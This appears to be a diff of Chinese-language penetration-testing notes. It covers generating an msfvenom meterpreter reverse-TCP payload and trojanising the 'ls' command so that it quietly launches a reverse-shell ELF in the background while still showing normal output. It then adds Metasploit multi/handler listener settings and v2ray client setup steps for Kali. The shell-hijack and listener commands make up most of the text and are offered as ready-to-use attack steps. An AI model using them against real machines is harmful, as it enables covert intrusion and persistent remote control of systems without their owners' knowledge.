@@ -50,8 +50,17 @@ eg:msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=4444 -a
 /usr/bin/ls_bak
 /root/reverse_tcp.elf & >& /dev/null &
 这样靶机的操作者使用ls的时候，还是能获取到一样的内容，但是再后台会同时发起连接
-```
 
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.231.128
+set LPORT 53
+```
+kali使用v2ray
+```
+https://github.com/v2ray/v2ray-core/releases/ ==下载核销的core 比如v2ray-linux-64.zip
+然后去https://github.com/Qv2ray/Qv2ray/tree/v2.7.0 获取appimage客户端,指定内核,导入就可以使用了
+```
 
 
 
